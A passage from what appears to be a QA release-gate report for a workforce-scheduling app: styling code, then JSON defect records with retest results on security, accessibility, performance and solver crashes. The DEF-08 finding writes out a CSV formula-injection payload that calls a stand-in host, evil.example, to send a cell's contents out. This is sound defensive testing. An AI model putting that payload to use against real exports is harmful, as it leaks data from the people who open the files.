<style>
/* Layout: a left-aligned release-gate dossier — verdict stamp first, then scorecard, defects, evidence. One column, 1120px max, wide tables scroll in place. */
:root {
  --paper: #f6f7f9; --sheet: #ffffff; --ink: #151a22; --ink-2: #4a5361; --ink-3: #6b7482; --rule: #dde1e7; --rule-2: #eceff3;
  --accent: #1f5c99; --accent-soft: #e6eef7;
  --crit: #a3191b; --crit-bg: #fbe9e8; --high: #b4470c; --high-bg: #fdeee3; --med: #8a6100; --med-bg: #fbf3dc; --low: #3f6b2a; --low-bg: #ebf4e4; --info: #4f5a6b; --info-bg: #eef0f3;
  --pass: #2f7a3a; --fail: #b3261e;
  --display: "Archivo", "Arial Narrow", system-ui, sans-serif; --body: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif; --mono: "IBM Plex Mono", ui-monospace, "Cascadia Mono", Consolas, monospace;
}
@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) {
  --paper: #0f1318; --sheet: #161b22; --ink: #e8ecf1; --ink-2: #b4bcc8; --ink-3: #8b94a3; --rule: #2a313b; --rule-2: #20262e; --accent: #7fb2e8; --accent-soft: #1b2a3b;
  --crit: #ff8a80; --crit-bg: #3a1716; --high: #ffab73; --high-bg: #3a2416; --med: #f0c75e; --med-bg: #342a12; --low: #9fd38a; --low-bg: #1d2e17; --info: #b4bcc8; --info-bg: #222932; --pass: #8fd49a; --fail: #ff8a80; color-scheme: dark } }
:root[data-theme="dark"] {
  --paper: #0f1318; --sheet: #161b22; --ink: #e8ecf1; --ink-2: #b4bcc8; --ink-3: #8b94a3; --rule: #2a313b; --rule-2: #20262e; --accent: #7fb2e8; --accent-soft: #1b2a3b;
  --crit: #ff8a80; --crit-bg: #3a1716; --high: #ffab73; --high-bg: #3a2416; --med: #f0c75e; --med-bg: #342a12; --low: #9fd38a; --low-bg: #1d2e17; --info: #b4bcc8; --info-bg: #222932; --pass: #8fd49a; --fail: #ff8a80; color-scheme: dark }
* { box-sizing: border-box }
body { background: var(--paper); color: var(--ink); font: 15px/1.55 var(--body); padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)); padding-block: 28px 64px }
.wrap { max-width: 1120px; margin: 0 auto; display: grid; gap: 40px }
h1, h2, h3 { font-family: var(--display); font-stretch: 82%; letter-spacing: -0.01em; text-wrap: balance; margin: 0; line-height: 1.12 }
h1 { font-size: clamp(30px, 5vw, 46px); font-weight: 800 }
h2 { font-size: 24px; font-weight: 700 }
h3 { font-size: 17px; font-weight: 700 }
p { margin: 0; max-width: 72ch }
.eyebrow { font: 600 11.5px/1 var(--body); letter-spacing: .09em; text-transform: uppercase; color: var(--ink-3) }
.mono, code, .num { font-family: var(--mono); font-variant-numeric: tabular-nums }
code { font-size: .88em; background: var(--rule-2); padding: 1px 5px; border-radius: 4px; overflow-wrap: anywhere }
a { color: var(--accent) }
:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px }
section { display: grid; gap: 16px; min-width: 0 }
.sec-head { display: grid; gap: 6px; border-top: 2px solid var(--ink); padding-top: 12px }
.sec-head p { color: var(--ink-2) }

/* header + verdict */
.top { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 28px; align-items: start }
.meta { display: flex; flex-wrap: wrap; gap: 6px 18px; color: var(--ink-2); font-size: 13.5px; margin-top: 10px }
.stamp { border: 3px solid var(--crit); color: var(--crit); padding: 10px 18px 12px; border-radius: 6px; transform: rotate(-2deg); text-align: center; background: var(--sheet); min-width: 190px }
.stamp.go { border-color: var(--pass); color: var(--pass) }
.stamp.cond { border-color: var(--high); color: var(--high) }
.stamp.cond b { font-size: 30px }
.rt { display: inline-flex; align-items: center; font: 600 11.5px/1 var(--body); padding: 4px 8px; border-radius: 4px; white-space: nowrap; border: 1px solid currentColor }
.rt-Fixed { color: var(--pass) } .rt-Partly { color: var(--med) } .rt-Still { color: var(--fail) } .rt-New { color: var(--accent) }
.rtgrid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); border: 1px solid var(--rule); background: var(--sheet); border-radius: 8px }
.rtgrid .fig { border-right: 1px solid var(--rule-2) }
.stamp b { display: block; font: 800 40px/1 var(--display); font-stretch: 75%; letter-spacing: .02em }
.stamp span { font-size: 12px; font-weight: 600; letter-spacing: .06em; text-transform: uppercase }
.lede { font-size: 17px; color: var(--ink); max-width: 80ch }
.sevrow { display: flex; flex-wrap: wrap; gap: 8px }
.sev { display: inline-flex; align-items: center; gap: 6px; font: 600 12px/1 var(--body); padding: 5px 9px; border-radius: 999px; white-space: nowrap }
.sev i { width: 7px; height: 7px; border-radius: 50%; background: currentColor; display: inline-block }
.s-Critical { color: var(--crit); background: var(--crit-bg) } .s-High { color: var(--high); background: var(--high-bg) } .s-Medium { color: var(--med); background: var(--med-bg) } .s-Low { color: var(--low); background: var(--low-bg) } .s-Info { color: var(--info); background: var(--info-bg) }

/* figures */
.figs { display: grid; grid-template-columns: repeat(auto-fit, minmax(170px, 1fr)); border: 1px solid var(--rule); background: var(--sheet); border-radius: 8px }
.fig { padding: 16px 18px; border-right: 1px solid var(--rule-2); display: grid; gap: 4px; align-content: start }
.fig:last-child { border-right: 0 }
.fig b { font: 700 28px/1 var(--display); font-stretch: 85% }
.fig small { color: var(--ink-2); font-size: 12.5px }

/* must-fix */
.mustfix { display: grid; gap: 0; border: 1px solid var(--rule); border-radius: 8px; background: var(--sheet); overflow: hidden }
.mf { display: grid; grid-template-columns: 74px 92px minmax(0, 1fr); gap: 12px; padding: 11px 16px; border-top: 1px solid var(--rule-2); align-items: baseline }
.mf:first-child { border-top: 0 }
.mf .t { font-weight: 600 } .mf .a { color: var(--ink-3); font-size: 12.5px }

/* tables */
.tbl { overflow-x: auto; border: 1px solid var(--rule); border-radius: 8px; background: var(--sheet) }
table { border-collapse: collapse; width: 100%; font-size: 13.5px }
th, td { text-align: left; padding: 9px 12px; border-top: 1px solid var(--rule-2); vertical-align: top }
thead th { border-top: 0; font: 600 11.5px/1.2 var(--body); letter-spacing: .06em; text-transform: uppercase; color: var(--ink-3); background: var(--sheet); position: sticky; top: 0 }
td.n, th.n { text-align: right; font-family: var(--mono); font-variant-numeric: tabular-nums; white-space: nowrap }
.ok { color: var(--pass); font-weight: 600 } .bad { color: var(--fail); font-weight: 600 }
.bar { display: inline-block; height: 8px; background: var(--accent); border-radius: 2px; vertical-align: middle; margin-left: 6px; opacity: .75 }
.bar.warn { background: var(--high) }

/* defects */
.filters { display: flex; flex-wrap: wrap; gap: 8px; align-items: center }
.chip { font: 600 12.5px/1 var(--body); border: 1px solid var(--rule); background: var(--sheet); color: var(--ink-2); padding: 7px 11px; border-radius: 999px; cursor: pointer }
.chip[aria-pressed="true"] { background: var(--ink); color: var(--paper); border-color: var(--ink) }
.search { font: 14px var(--body); padding: 7px 11px; border: 1px solid var(--rule); border-radius: 6px; background: var(--sheet); color: var(--ink); min-width: 0; flex: 1 1 220px; max-width: 340px }
.defects { display: grid; gap: 8px }
details.d { background: var(--sheet); border: 1px solid var(--rule); border-left: 4px solid var(--rule); border-radius: 6px }
details.d.Critical { border-left-color: var(--crit) } details.d.High { border-left-color: var(--high) } details.d.Medium { border-left-color: var(--med) } details.d.Low { border-left-color: var(--low) } details.d.Info { border-left-color: var(--info) }
details.d summary { list-style: none; cursor: pointer; display: grid; grid-template-columns: 70px 86px minmax(0, 1fr) auto; gap: 12px; padding: 11px 14px; align-items: baseline }
details.d summary::-webkit-details-marker { display: none }
details.d summary .area { color: var(--ink-3); font-size: 12.5px; text-align: right }
details.d[open] summary { border-bottom: 1px solid var(--rule-2) }
.dl { display: grid; grid-template-columns: 130px minmax(0, 1fr); gap: 8px 14px; padding: 12px 14px 14px; font-size: 13.5px }
.dl dt { color: var(--ink-3); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: .05em; padding-top: 2px }
.dl dd { margin: 0; overflow-wrap: anywhere }

.two { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 16px }
.list { margin: 0; padding-left: 20px; display: grid; gap: 8px; max-width: 90ch }
.note { color: var(--ink-2); font-size: 13.5px }
pre { font: 12.5px/1.5 var(--mono); background: var(--sheet); border: 1px solid var(--rule); border-radius: 6px; padding: 12px 14px; overflow-x: auto; margin: 0 }
.toc { display: flex; flex-wrap: wrap; gap: 6px 14px; font-size: 13px }
.toc a { color: var(--ink-2); text-decoration: none; border-bottom: 1px solid var(--rule) }
.toc a:hover { color: var(--accent) }
@media (max-width: 760px) {
  .top { grid-template-columns: 1fr } .stamp { justify-self: start }
  .two { grid-template-columns: 1fr }
  .mf { grid-template-columns: 64px minmax(0, 1fr) } .mf .a { grid-column: 2 }
  details.d summary { grid-template-columns: 62px minmax(0, 1fr) } details.d summary .sev { grid-column: 2; justify-self: start } details.d summary .area { grid-column: 2; text-align: left }
  .dl { grid-template-columns: 1fr } .fig { border-right: 0; border-bottom: 1px solid var(--rule-2) }
}
@media (prefers-reduced-motion: reduce) { * { transition: none !important } }
</style>
<style>
/* Additions for the consolidated report: two verdict tracks side by side, run-1 vs run-2 cells. Uses the release-gate tokens only. */
.tracks { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 16px }
.track { background: var(--sheet); border: 1px solid var(--rule); border-radius: 8px; padding: 16px 18px; display: grid; gap: 10px; align-content: start; min-width: 0 }
.track .vrow { display: flex; flex-wrap: wrap; gap: 8px 14px; align-items: baseline }
.vtag { font: 800 20px/1 var(--display); font-stretch: 80%; letter-spacing: .02em }
.vtag.v-GO { color: var(--pass) } .vtag.v-CONDITIONAL { color: var(--high) } .vtag.v-NO-GO, .vtag.v-NOT { color: var(--crit) }
.was { color: var(--ink-3); font-size: 12.5px }
.was s { color: var(--ink-3) }
.track p { font-size: 13.5px; color: var(--ink-2) }
.trk { font: 600 11px/1 var(--body); letter-spacing: .05em; text-transform: uppercase; color: var(--ink-3); white-space: nowrap }
.arrow { color: var(--ink-3); padding: 0 4px }
td .sub { display: block; color: var(--ink-3); font-size: 12px; margin-top: 2px; max-width: 46ch; overflow-wrap: anywhere }
.cmp td:nth-child(2) { color: var(--ink-2) }
@media (max-width: 760px) { .tracks { grid-template-columns: 1fr } }
</style>

word reset.","retest":{"status":"Fixed","note":"Old token refused straight after the account is disabled: 200 before, 401 immediately after and 6 s later."},"track":"Release gate"},{"id":"DEF-14","sev":"Critical","area":"Reliability · Engine (scheduling)","title":"Forecast/schedule engine crashes with a native abort inside the CP-SAT solver, and stays down","steps":"Seen twice: (1) during scripts/demo-seed.mjs (forecast → schedule); (2) during the gateway's own test run, seconds after 'cancel stops a running build inside the engine' passed, while the next multi-group solve ran","expected":"A failed solve fails that one request; the engine keeps serving","actual":"'Fatal Python error: Aborted' in ortools cp_model.Solve (backend/engine/scheduling.py:465, solve_cpsat) with the new cancel watchdog thread (scheduling.py:459, solver.StopSearch from another thread) alive. The whole process dies: every forecast and schedule request then returns 503 until someone restarts it. Earlier dead engines also left 3 hung server.py processes (each with 4 workers) running. Not reproduced on demand: 3 rounds of start → cancel → solve passed","evidence":"engine-crash-1.log (native stack of all threads); gateway-suite.txt (12 tests failed with ENGINE_UNAVAILABLE after the crash); /health engine:false","fix":"Run each CP-SAT solve in a child process (the ProcessPool already exists) so a native abort kills one job, not the server; re-check the uncommitted StopSearch-from-watchdog change (prefer a solution-callback stop or the solver's own time limit); run the engine under a supervisor that restarts it and kills the whole process tree; alert on /health engine:false.","retest":{"status":"Fixed","note":"Crash injection: the CP-SAT solver process was killed mid-build. The engine stayed up (0 restarts), the build fell back to HiGHS and finished DONE (\"cpsat: failed (the solver process ended without an answer)\", \"highs: feasible\"). Each solve now runs in its own process."},"track":"Release gate"},{"id":"DEF-02","sev":"High","area":"Workforce · Time off","title":"Admin can book overlapping time off for the same person","steps":"POST /workforce/time-off for an employee (15–16 days out), approve → POST another for days 16–17","expected":"400/409 overlap (self-service already blocks this: 'You already have … that overlaps these dates')","actual":"201 Created — double-booked leave, double-counted balance and pay","evidence":"api-functional › Workforce (overlapping time off rejected → 201)","fix":"Run the same overlap check used by POST /me/time-off inside POST /workforce/time-off (and in bulk/import paths).","retest":{"status":"Fixed","note":"A second, overlapping admin booking now returns 409 with a clear message naming the existing vacation."},"track":"Release gate"},{"id":"DEF-03","sev":"High","area":"Security · Configuration","title":"Administrator uses a password on the app's own blocklist and is never asked to change it","steps":"Sign in as admin (tenant ORG)","expected":"Strong password; temporary/bootstrap passwords force a change","actual":"Password is in EASY list of passwordPolicy.ts and contains the username; mustChangePassword=false","evidence":"api-security SEC-01","fix":"Rotate before go-live. Apply checkNewPassword() to BOOTSTRAP_ADMIN_PASSWORD and set must_change_password=true for the bootstrap admin.","retest":{"status":"Still open","note":"Admin still signs in with the blocklisted bootstrap password and is not asked to change it (mustChangePassword=false). SEC-01 fails."},"track":"Release gate"},{"id":"DEF-04","sev":"High","area":"Admin UI · Command palette","title":"Ctrl+K search shows fake prototype records and cannot find real ones","steps":"Press Ctrl+K → type 'Jane' / 'Demo Support' / 'Shift Templates'","expected":"Live employees, groups and screens","actual":"'Jane Doe · EMP-1024 · Customer Billing' (does not exist); real group and screen names: 'No matching records'","evidence":"admin-e2e A-04, screens/palette-fake-data.png; src/components/common/CommandPalette.tsx uses SEED_EMPLOYEES/SEED_WFM_GROUPS/SEED_SKILLS from src/services/wfmStore.ts","fix":"Search the API (or the loaded stores) and the route list; delete the SEED_* data from the production bundle.","retest":{"status":"Fixed","note":"Prototype SEED_ data is gone. In the live palette \"Jane\" and \"Voice Inbound\" now find nothing, while \"Agent1\" lists the real employees, \"Demo Support\" the real group and \"Shift Templates\" the screen; Enter opens the result."},"track":"Release gate"},{"id":"DEF-05","sev":"High","area":"Accessibility","title":"Admin sidebar cannot be used with a keyboard or screen reader","steps":"Load any admin screen → press Tab repeatedly","expected":"Every navigation item is focusable (links/buttons)","actual":"Only 1 focus stop in the sidebar in 40 Tabs — items are \u003cdiv onClick> with no role or tabindex","evidence":"admin-e2e A-03; src/components/layout/NavigationSidebar.tsx","fix":"Render items as \u003ca href> (they already have URLs) or \u003cbutton>, with aria-current on the active one.","retest":{"status":"Fixed","note":"Sidebar items are now focusable buttons: Tab reaches Overview, Workforce, Employees, Teams, Skills and the rest (A-03 passes)."},"track":"Release gate"},{"id":"DEF-06","sev":"High","area":"Accessibility","title":"Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical)","steps":"axe-core WCAG 2.1 AA scan of all 51 admin screens","expected":"0 critical violations","actual":"button-name: 530 elements on 51/51 screens; plus select-name and missing form labels on one screen","evidence":"admin-crawl (axe) — see Accessibility section","fix":"Add aria-label to icon buttons (lucide icons inside \u003cbutton>), label selects/inputs.","retest":{"status":"Partly fixed","note":"Unnamed buttons are gone: 530 elements on 51 screens down to 0. Still 6 form fields without labels on Administration > Alerts & reports (critical \"label\" rule)."},"track":"Release gate"},{"id":"DEF-07","sev":"High","area":"Release · Licensing","title":"AG Grid Enterprise runs without a licence key","steps":"Open Workforce › Employees (console)","expected":"Licensed grid, no watermark","actual":"Console prints the AG Grid Enterprise licence banner; grids show the trial watermark","evidence":"admin-crawl console errors on Employees, Time Off, Attendance, Timeline, Live coverage, Activities","fix":"Set VITE_AG_GRID_LICENSE for the production build (or switch to the Community edition). Using Enterprise in production unlicensed breaches the licence.","retest":{"status":"Still open","note":"ag-grid-enterprise is still a dependency, there is no licence key in any env file, and the licence banner is still logged on 4 screens (Employees, Time off, Attendance, Activities)."},"track":"Release gate"},{"id":"DEF-08","sev":"Medium","area":"Security · Audit export","title":"CSV formula injection in the audit export","steps":"Create a team named =HYPERLINK(\"http://evil.example/?x=\"&A1,\"x\") → download /audit/export.csv","expected":"Cell neutralised ('=…)","actual":"Written raw: \"=HYPERLINK(\"\"http://evil.example/…\"\")\" — runs when opened in Excel","evidence":"api-security SEC-14","fix":"Reuse csvCell from modules/reports.ts (prefix = + - @ with ') in auditRoutes.ts and integrations/runner.ts and any other CSV writer.","retest":{"status":"Fixed","note":"The audit CSV now writes the team name with a leading apostrophe ('=HYPERLINK...), so spreadsheets show it as text."},"track":"Release gate"},{"id":"DEF-09","sev":"Medium","area":"Security · Sessions","title":"Session token accepted in the URL (?token=) on every REST route","steps":"GET /api/v1/users?token=\u003cjwt>","expected":"401 (header only)","actual":"200; the web app also opens /ws?token=\u003cjwt>","evidence":"api-security SEC-05","fix":"Accept ?token= only on the WebSocket upgrade, ideally with a short-lived single-use ticket instead of the session JWT; strip it from access logs.","retest":{"status":"Fixed","note":"GET /users?token=\u003cvalid JWT> now returns 401."},"track":"Release gate"},{"id":"DEF-10","sev":"Medium","area":"Security · Sign-in","title":"Response time reveals whether a username exists","steps":"POST /auth/login with a wrong password for a real vs an unknown username (5 each)","expected":"Same timing","actual":"Real user median ≈ 808 ms, unknown ≈ 11 ms (bcrypt only runs for real users)","evidence":"api-security SEC-07","fix":"When no user is found, bcrypt.compare against a fixed dummy hash before failing.","retest":{"status":"Fixed","note":"Median sign-in time is 293 ms for a real user and 301 ms for an unknown one."},"track":"Release gate"},{"id":"DEF-11","sev":"Medium","area":"API · Validation","title":"Impossible calendar date returns 500 and leaks the PostgreSQL error","steps":"POST /me/time-off {startDate:'2026-02-30', endDate:'2026-02-30'}","expected":"400 'not a valid date'","actual":"500 'date/time field value out of range: \"2026-02-30\"'","evidence":"api-security SEC-15","fix":"isoDay is a regex only — add a real-date refine to the shared isoDay schema (affects every date input), and never return raw DB messages on 500.","retest":{"status":"Fixed","note":"2026-02-30 now returns 400 \"One of the values is not valid (check dates and numbers).\" with no database text."},"track":"Release gate"},{"id":"DEF-12","sev":"Medium","area":"Audit","title":"Failed sign-in attempts are not written to the audit log","steps":"Fail a sign-in for admin → search audit","expected":"LOGIN_FAILED entry with IP","actual":"Only successful LOGIN is audited (lockouts are in Redis only)","evidence":"api-functional › Audit","fix":"Audit failed attempts and lockouts (needed for SOC 2 / ISO 27001 evidence).","retest":{"status":"Fixed","note":"A failed admin sign-in now appears in the audit log."},"track":"Release gate"},{"id":"DEF-13","sev":"Medium","area":"Performance · Forecasting","title":"Forecast Builder takes ~34 s to finish loading","steps":"Open /forecasting/forecast-builder for Demo Support (10 weeks of history, one queue)","expected":"\u003c 3 s","actual":"GET /forecast/history-quality takes 15–32 s and is requested twice on every load","evidence":"performance PERF-03 + request timing","fix":"Cache history-quality per group/version, compute it in the background, and de-duplicate the request in the screen.","retest":{"status":"Fixed","note":"History-quality API answers in 21 ms (2 ms cached); Forecast Builder settles in 6.6 s on the dev server (was about 34 s)."},"track":"Release gate"},{"id":"DEF-15","sev":"Medium","area":"Performance","title":"Admin JavaScript is a single 4.2 MB chunk (1.18 MB gzipped)","steps":"vite build","expected":"Route-level code splitting, main chunk \u003c 500 kB","actual":"index.js 4,234 kB + exceljs 940 kB; Vite warns about chunk size","evidence":"static/build-admin.txt","fix":"Lazy-load each module screen (React.lazy) and exceljs/recharts/ag-grid only where used.","retest":{"status":"Fixed","note":"Screens are now lazy-loaded: entry chunk 282 kB (87 kB gzip) across 35 chunks. AG Grid (2.7 MB) and exceljs (940 kB) load only on screens that use them."},"track":"Release gate"},{"id":"DEF-16","sev":"Medium","area":"Performance · Scale","title":"Employee list is not paginated","steps":"GET /workforce/employees (≈ 420 people)","expected":"Paged/filtered","actual":"328 kB per call; 40 req/s with p95 627 ms at 25 concurrent","evidence":"performance PERF-01/02","fix":"Server-side paging and field selection; the grid can use the AG Grid server-side row model.","retest":{"status":"Partly fixed","note":"?limit= and ?offset= are now accepted, but paging happens after a capped 2,000-row load: x-total-count says 2000 on a 50,656-person tenant, offset 40000 returns 0 rows, and 50 rows cost the same ~500 ms as 2,000. Push LIMIT/OFFSET (or keyset paging) into the SQL and return the true total (see scale DEF-29)."},"track":"Release gate"},{"id":"DEF-17","sev":"Medium","area":"Employee portal · Mobile","title":"Portal is not usable on a phone browser","steps":"Open localhost:3001 at 412 px width (Pixel 7)","expected":"Responsive layout / bottom tabs","actual":"Fixed 224 px sidebar leaves 188 px for content; Schedule scrolls sideways","evidence":"responsive R-01, screens/mobile-portal-*.png","fix":"Collapse the sidebar into a bottom tab bar under md breakpoint (same IA as the mobile app).","retest":{"status":"Fixed","note":"At 412 px the portal has no sidebar and no sideways scroll; content uses the full width on every section."},"track":"Release gate"},{"id":"DEF-18","sev":"Medium","area":"Accessibility","title":"Colour contrast below WCAG AA on every screen of both apps","steps":"axe scan","expected":"4.5:1 for text","actual":"822 elements on 51/51 admin screens; portal login and 4/5 sections","evidence":"admin-crawl, portal-e2e P-01/P-03","fix":"Darken #A3A3A3/#737373 secondary text on white/#FAFAF8 backgrounds.","retest":{"status":"Partly fixed","note":"Low-contrast elements roughly halved (822 to 457) but still present on all 51 admin screens; the portal sign-in still has 2."},"track":"Release gate"},{"id":"DEF-19","sev":"Medium","area":"Security · Configuration","title":"NATS TLS certificate checking is switched off","steps":"backend/.env","expected":"NATS_TLS_REJECT_UNAUTHORIZED=true in production","actual":"false","evidence":"backend/.env (value only, no secret read)","fix":"Set to true with a trusted CA for production.","retest":{"status":"Still open","note":"backend/.env still has NATS_TLS_REJECT_UNAUTHORIZED=false."},"track":"Release gate"},{"id":"DEF-43","sev":"Medium","area":"Performance · Intraday","title":"Adherence takes about 2 s per call on a large tenant","steps":"GET /intraday/adherence?groupId=\u003cDemo Support> 15 times, on the tenant that now also holds the 50,656-person scale data","expected":"Close to the first run (p95 23 ms): the group still has the same people","actual":"p50 1,913 ms, p95 2,232 ms. The three SQL queries behind it take about 20 ms in total when run directly as the database owner (row-level security does not apply there), so the time goes on row-level-security checks or work in the gateway. /workforce/employees is 641 ms and 1.6 MB for 2,000 rows, and under 25 parallel requests it manages 1 request per second (p50 15 s, p95 21 s; all 200).","evidence":"performance > PERF-01 (re-run on a restarted gateway); EXPLAIN ANALYZE of the adherence queries in psql","fix":"Profile the endpoint as the app role (RLS on); make sure the RLS policy uses an indexed, STABLE tenant lookup; add an index on employees(primary_group_id) and a GIN index on eligible_group_ids.","retest":{"status":"New","note":"Found in this re-test."},"track":"Release gate"},{"id":"DEF-20","sev":"Low","area":"Employee portal","title":"Offers show an empty group name to the employee","steps":"GET /me/offers as an agent","expected":"groupName 'Demo Support' (as admin sees)","actual":"groupName \"\"","evidence":"api-functional › Self-service","fix":"Join the group name in the /me/offers query.","retest":{"status":"Fixed","note":"Code check: /me/offers now joins wfm_groups and returns group_name. Not seen live, because the demo agent had no open offers during the run."},"track":"Release gate"},{"id":"DEF-21","sev":"Low","area":"Employee portal · UX","title":"No URLs per section: reload always returns to Home, Back leaves the app","steps":"Open Inbox → reload","expected":"Stay on Inbox (admin app already has per-screen URLs)","actual":"Back on Home; nothing can be bookmarked or linked from a notification e-mail","evidence":"portal-e2e P-08","fix":"Use the same History-API routing as src/services/routes.ts.","retest":{"status":"Fixed","note":"Each portal section has its own URL; reloading on /inbox stays on Inbox (P-08 passes)."},"track":"Release gate"},{"id":"DEF-22","sev":"Low","area":"Employee portal · UX","title":"Time-off form accepts end-before-start until it is submitted","steps":"Request time off → Start = day 60, End = day 55","expected":"Inline error, Submit disabled","actual":"Submit enabled; the server's 400 message is shown afterwards","evidence":"portal-e2e P-05","fix":"Validate in the form (it already pre-checks overlaps).","retest":{"status":"Fixed","note":"The form flags an end date before the start date before it is submitted (P-05 passes)."},"track":"Release gate"},{"id":"DEF-23","sev":"Low","area":"Workforce · Validation","title":"Hire date in 2099 is accepted","steps":"POST /workforce/employees hireDate 2099-01-01","expected":"400 (e.g. > 1 year ahead)","actual":"201","evidence":"api-functional › Workforce","fix":"Bound hire dates.","retest":{"status":"Fixed","note":"Hire date 2099-01-01 now returns 400 \"hireDate must be between 1950 and a year from now\"."},"track":"Release gate"},{"id":"DEF-24","sev":"Low","area":"API","title":"Malformed JSON returns error code INTERNAL","steps":"POST /config/groups with body '{\"name\":'","expected":"400 BAD_JSON","actual":"400 with code INTERNAL","evidence":"api-security SEC-12","fix":"Map body-parser SyntaxError to a 400 BAD_REQUEST code.","retest":{"status":"Fixed","note":"Broken JSON now returns 400 BAD_JSON."},"track":"Release gate"},{"id":"DEF-25","sev":"Low","area":"Security · Sign-in","title":"Unauthenticated endpoints reveal account existence and organisation name","steps":"POST /auth/discover {identifier:\u003cemail>}; GET /auth/login-options","expected":"Off in production unless needed","actual":"Returns the organisation for a real e-mail, [] otherwise (rate-limited 15 per 15 min)","evidence":"api-security SEC-08","fix":"Set LOGIN_DISCOVERY=false for production if the org code is distributed another way.","retest":{"status":"Still open","note":"Unchanged (a configuration choice): /auth/discover still returns the organisation for a known login and an empty list for an unknown one; /auth/login-options names the organisation. Set LOGIN_DISCOVERY=false if org codes are handed out another way."},"track":"Release gate"},{"id":"DEF-26","sev":"Low","area":"Both apps","title":"No favicon — 404 on every page load","steps":"GET /favicon.ico on :3000 and :3001","expected":"200","actual":"404 (console error on every screen)","evidence":"admin-crawl console","fix":"Add a favicon to public/.","retest":{"status":"Fixed","note":"Both apps link /favicon.svg, served as image/svg+xml."},"track":"Release gate"},{"id":"DEF-27","sev":"Low","area":"Tooling","title":"scripts/demo-seed.mjs cannot finish","steps":"Run the seed on a stack with FORCE_PASSWORD_CHANGE on (the default)","expected":"Seed completes","actual":"The giveaway step gets 403 'Choose a new password' (new logins are temporary), and a failed step leaves the group behind so the seed refuses to run again","evidence":"qa/seed-finish.mjs works around it","fix":"Change the demo logins' passwords in the seed; make the seed resumable.","retest":{"status":"Fixed","note":"Code check: the seed now handles the forced password change. Not re-run, because it rewrites the demo data."},"track":"Release gate"},{"id":"DEF-44","sev":"Low","area":"Reliability · Gateway","title":"Gateway process ended once with no log line","steps":"Run the API-latency test (12 endpoints x 15 calls) straight after the full suite","expected":"The gateway stays up, or logs why it stopped","actual":"The process ended with exit code 127 and nothing in its log; the test got ECONNRESET. After a restart the same test ran cleanly, so it did not reproduce.","evidence":"The gateway log ends on normal 200 lines; the shell reported exit code 127","fix":"Run the gateway under a process manager that restarts it, and log uncaughtException, unhandledRejection and process exit before quitting.","retest":{"status":"New","note":"Found in this re-test; seen once."},"track":"Release gate"},{"id":"DEF-45","sev":"Low","area":"Tooling · Engine tests","title":"Engine unit tests: 3 of 91 fail after the solver change","steps":"cd backend/engine && python -m pytest -q","expected":"91 passed (as in the first run)","actual":"88 passed, 3 failed. test_a_failing_primary_falls_through_to_the_next_solver and test_every_solver_failing_still_ends_with_the_greedy_roster stub solve_cpsat, but the solver now runs in a separate process the stub never reaches (both pass with ENGINE_ISOLATE_SOLVES=0). test_no_history_changes_nothing is flaky: the same request can give a different roster (it failed 1 of 2 times in-process).","evidence":"pytest output saved as static/pytest-rerun.txt in the QA run folder","fix":"Stub solve_cpsat_isolated (or set ENGINE_ISOLATE_SOLVES=0) in those two tests; fix the CP-SAT random seed and use 1 search worker in the determinism test.","retest":{"status":"New","note":"Found in this re-test."},"track":"Release gate"},{"id":"DEF-28","sev":"Info","area":"Data hygiene","title":"Existing data to clean before go-live","steps":"Configuration › Integration Station; Data Management › Staged imports","expected":"—","actual":"A connector points at nats://192.168.9.81:4222 (TIMEOUT); 6 failed history imports (672–5,000 rows rejected); test employees EXT7172 etc.","evidence":"admin-crawl visible errors","fix":"Start production from a clean database; do not migrate this test data.","retest":{"status":"Still applies","note":"Still a pre-launch housekeeping item. The database now also holds the 50,000-person SCALE test data and QA- records from both runs."},"track":"Release gate"},{"id":"DEF-29","sev":"Critical","area":"Scheduling · Engine","title":"Engine crashes on large solves and takes every running build down with it","steps":"Schedule groups of 3,000–6,000 people (one week, 90 s limit). Runs: 12 groups together; then one at a time; then one at a time without splitting.","expected":"A solve that runs out of time or memory fails alone; the engine keeps serving","actual":"15 engine crashes in the scale run (engine-supervisor.log; 17 counting the 2 earlier in the day). All 12 builds started together failed. One at a time: every group that the gateway splits into parts (S02, S03, S05 and the split runs of S09, S11) crashed the engine; S10 survived one crash. Logs: 'Fatal Python error: Aborted' (14; 2 of them show SCIP 'Insufficient memory for allocation' followed by an OR-Tools 'Check failed' abort), and one 'Windows fatal exception: access violation' in backends.py respond() while building the reply. The parts of one group are solved side by side in one engine process, each CP-SAT model plus the HiGHS/SCIP backups in memory at once.","evidence":"scale/engine-run-*.log, engine-supervisor.log; S11 whole: DONE 157 s, no crash; S11 in parts: crash","fix":"Solve each part/solve in its own child process with a memory cap so a native abort kills one solve, not the server; skip the MIP backups (HiGHS/SCIP) above a candidate size they cannot handle; run parts one after another when memory is short; supervise the engine and retry the job after a restart.","track":"50k scale","retest":{"status":"Fixed","note":"Each solve now runs in its own process. CP-SAT still died natively on parts of S01, S05, S06 and S10 (exit code 0xC0000409), but only that process ended: the engine server itself had 0 crashes, other builds carried on, and every build finished. The crashes themselves are now DEF-48."}},{"id":"DEF-30","sev":"Critical","area":"Gateway · Availability","title":"Preparing a large schedule freezes the gateway for every user","steps":"Start schedule builds for groups of 5,000–6,000 people; call GET /health and the admin app meanwhile","expected":"The API stays responsive while schedules are built in the background","actual":"Gateway pinned at 100% of one CPU core (Node main thread, 430→604 MB); /health timed out at 15–30 s continuously for 40+ minutes; DB sessions sat 'idle in transaction' waiting for the gateway; S03 spent 16 minutes preparing. Opening Schedule Quality for a 6,000-person group did the same for 2+ minutes.","evidence":"health-samples.jsonl; scheduleRoutes.ts ~598–640: candidates are built on the main thread, rebuilt up to 8 times at coarser settings, yielding only every 25 people","fix":"Build candidates in a worker thread or in the engine; compute the candidate count arithmetically and pick the thinning level once instead of rebuilding the list; cap per-request CPU for report screens and cache their results.","track":"50k scale","retest":{"status":"Partly fixed","note":"Normal builds no longer freeze the API: with two 4,000–6,000-person builds preparing at once for 2 hours, health checks had a median of 546 ms. But 21 of 435 took over 10 s and 7 got no answer within 30 s, and the over-limit 